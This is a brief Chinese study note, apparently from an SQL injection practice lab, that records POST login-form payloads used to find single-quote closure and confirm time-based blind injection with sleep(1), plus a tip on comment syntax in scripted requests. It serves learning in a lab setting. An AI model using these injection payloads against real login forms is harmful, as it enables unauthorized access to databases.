# 确认闭合状态
输入：passwd=Dumb&submit=Submit&uname=Dumb  
正常，无回显

输入：passwd=Dumb'&submit=Submit&uname=Dumb  
错误

输入：passwd=Dumb"&submit=Submit&uname=Dumb  
还是错误

输入：passwd=Dumb' --+&submit=Submit&uname=Dumb  
正确了，说明本关是单引号闭合，而且没有报错信息，那就考虑盲注了

测试:passwd=Dumb' and sleep(1)--+&submit=Submit&uname=Dumb  
页面响应了一会，说明结论正确

这时候就可以写脚本了，需要学一下requests库如何传递post数据


参考脚本：第9关

# post脚本问题
在使用脚本时注释符不能使用--+，而需改成#或者-- (有个空格)  
详细请看记录中第11条